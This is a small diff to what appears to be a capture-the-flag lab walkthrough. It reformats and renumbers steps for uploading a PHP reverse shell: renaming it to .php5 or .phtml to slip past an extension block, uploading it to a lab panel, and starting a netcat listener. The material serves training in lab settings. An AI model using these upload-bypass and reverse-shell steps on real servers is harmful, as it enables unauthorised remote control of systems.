@@ -75,14 +75,15 @@ Reverse shell 🐚 Upload
    - Download and extract the php reverse shell .gz
    - Save the shell as `shell.php5` or `shell.phtml` (avoid `.php` as it's blocked).
    - Change the following info in the shell
-    ip [myip]
-    port [9999]
+   
+            ip [myip]
+            port [9999]
 
-2. **Upload Shell**
+3. **Upload Shell**
    - Go to: `http://10.10.182.156/panel`
    - Upload your renamed shell file.
 
-3. **Start Listener**
+4. **Start Listener**
 
         root@ip-10-10-91-11:~# nc -lvnp 9999
         Listening on 0.0.0.0 9999
